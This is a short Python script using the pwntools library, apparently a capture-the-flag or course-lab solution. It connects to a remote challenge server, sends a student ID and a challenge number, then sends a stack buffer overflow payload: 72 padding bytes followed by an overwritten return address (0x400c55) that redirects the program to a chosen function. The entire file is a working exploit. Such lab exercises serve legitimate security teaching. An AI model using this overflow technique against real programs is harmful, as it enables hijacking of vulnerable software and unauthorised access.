from pwn import *
from pwn import p64

#p = process("./standard-3")

host = "sister21.tech"
port = 32778

p = remote(host, port)

p.recvuntil(b"NIM: ")
nim = b"13522091"
p.sendline(nim)

p.recvuntil(b"Challenge: ")
kirim = b"4"
p.sendline(kirim)

temp = p64(0x0000000000400c55)

offset = 72 * b'A' 

flag = offset + temp

p.recvuntil(b"Enter your payload: ")

p.sendline(flag)

print(p.recvline())
print(p.recvline())
p.close()